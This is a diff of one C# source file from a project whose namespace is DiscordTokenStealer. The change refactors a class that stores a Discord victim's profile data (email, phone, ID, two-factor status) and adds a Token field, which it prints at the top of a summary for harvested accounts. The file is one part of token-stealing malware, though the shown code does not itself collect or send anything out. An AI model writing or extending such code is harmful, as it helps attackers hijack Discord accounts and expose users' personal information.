@@ -1,46 +1,70 @@
-﻿using System.Text;
-using System.Text.Json.Serialization;
+﻿using System.Text.Json.Serialization;
+using Cysharp.Text;
 
 namespace DiscordTokenStealer.Discord;
 
 public class DiscordUser
 {
-    private const string Empty = "None";
-    [JsonPropertyName("username")] [JsonInclude] public string Username { get; private set; }
-    [JsonPropertyName("discriminator")] [JsonInclude] public string Discriminator { get; private set; }
-    [JsonPropertyName("id")] [JsonInclude] public string Id { get; private set; }
-    [JsonPropertyName("locale")] [JsonInclude] public string Locale { get; private set; }
-    [JsonPropertyName("mfa_enabled")] [JsonInclude] public bool TwoFactor { get; private set; }
-    [JsonPropertyName("email")] [JsonInclude] public string Email { get; private set; }
-    [JsonPropertyName("verified")] [JsonInclude] public bool EmailVerified { get; private set; }
-    [JsonPropertyName("premium_type")] [JsonInclude] public int PremiumType { get; private set; }
-
-    [JsonIgnore] private string? _phoneNumber;
-    [JsonPropertyName("phone")] [JsonInclude] public string PhoneNumber
+    public DiscordUser(string? phoneNumber, string? aboutMe, string username, string discriminator, string id,
+        string locale, bool twoFactor, string email, bool emailVerified, int premiumType)
     {
-        get => string.IsNullOrEmpty(_phoneNumber) ? Empty : _phoneNumber;
-        private set => _phoneNumber = value;
+        PhoneNumber = phoneNumber;
+        AboutMe = aboutMe;
+        Username = username;
+        Discriminator = discriminator;
+        Id = id;
+        Locale = locale;
+        TwoFactor = twoFactor;
+        Email = email;
+        EmailVerified = emailVerified;
+        PremiumType = premiumType;
     }
 
-    [JsonIgnore] private string? _aboutMe;
-    [JsonPropertyName("bio")] [JsonInclude] public string AboutMe
-    {
-        get => string.IsNullOrEmpty(_aboutMe) ? Empty : _aboutMe;
-        private set => _aboutMe = value;
-    }
+    [JsonIgnore] public string? Token { get; set; }
+    [JsonPropertyName("username")] public string Username { get; }
+    [JsonPropertyName("discriminator")] public string Discriminator { get; }
+    [JsonPropertyName("id")] public string Id { get; }
+    [JsonPropertyName("locale")] public string Locale { get; }
+    [JsonPropertyName("mfa_enabled")] public bool TwoFactor { get; }
+    [JsonPropertyName("email")] public string Email { get; }
+    [JsonPropertyName("verified")] public bool EmailVerified { get; }
+    [JsonPropertyName("premium_type")] public int PremiumType { get; }
+    [JsonPropertyName("phone")] public string? PhoneNumber { get; }
+    [JsonPropertyName("bio")] public string? AboutMe { get; }
 
     public override string ToString()
     {
-        return new StringBuilder()
-                .AppendLine("\tSummary:")
-                .AppendLine($"\t\tUser: {Username}#{Discriminator} ({Id})")
-                .AppendLine($"\t\tEmail: {Email}")
-                .AppendLine($"\t\tPhone: {PhoneNumber}")
-                .AppendLine($"\t\tLocale: {Locale}")
-                .AppendLine($"\t\tVerified: {EmailVerified}")
-                .AppendLine($"\t\tTwo-Factor: {TwoFactor}")
-                .AppendLine($"\t\tAbout Me: {AboutMe}")
-                .AppendLine($"\t\tNitro: {(DiscordNitroType)PremiumType}")
-                .ToString();
+        using var sb = ZString.CreateUtf8StringBuilder();
+        if (!string.IsNullOrEmpty(Token))
+        {
+            sb.AppendLine($"\t{Token}");
+        }
+        sb.AppendLine("\tSummary:");
+        sb.AppendLine($"\t\tUser: {Username}#{Discriminator} ({Id})");
+        sb.AppendLine($"\t\tEmail: {Email}");
+        if (!string.IsNullOrEmpty(PhoneNumber))
+        {
+            sb.AppendLine($"\t\tPhone: {PhoneNumber}");
+        }
+        sb.AppendLine($"\t\tLocale: {Locale}");
+        sb.AppendLine($"\t\tVerified: {EmailVerified}");
+        sb.AppendLine($"\t\tTwo-Factor: {TwoFactor}");
+        if (!string.IsNullOrEmpty(AboutMe))
+        {
+            sb.AppendLine($"\t\tAbout Me: {AboutMe}");
+        }
+        sb.AppendLine($"\t\tNitro-Type: {(DiscordNitroType) PremiumType}");
+        return sb.ToString();
+    }
+
+    public override bool Equals(object? obj)
+    {
+        if (obj is not DiscordUser user) return false;
+        return Id == user.Id;
+    }
+
+    public override int GetHashCode()
+    {
+        return Id.GetHashCode();
     }
 }
